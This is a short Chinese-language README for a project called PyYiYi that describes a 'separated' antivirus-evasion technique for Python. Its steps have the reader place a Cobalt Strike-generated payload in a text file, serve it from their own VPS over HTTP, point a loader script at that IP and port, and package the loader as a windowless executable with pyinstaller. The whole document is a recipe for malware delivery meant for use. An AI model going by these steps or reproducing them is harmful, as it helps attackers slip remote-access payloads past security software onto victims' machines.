# PyYiYi
提供一个Python分离免杀思路
步骤：
  1. asd.txt不要动;
  2. abcd.txt中放入Cobalt_Strike生成的Python的payload;
  3. 将asd.txt和abcd.txt放到自己的VPS上，并启动http服务;
  4. 更改payload.py中的ip和端口为http服务的ip和端口;
  5. 用"pyinstaller -F -w shellcode.py"将.py文件打包为exe文件。
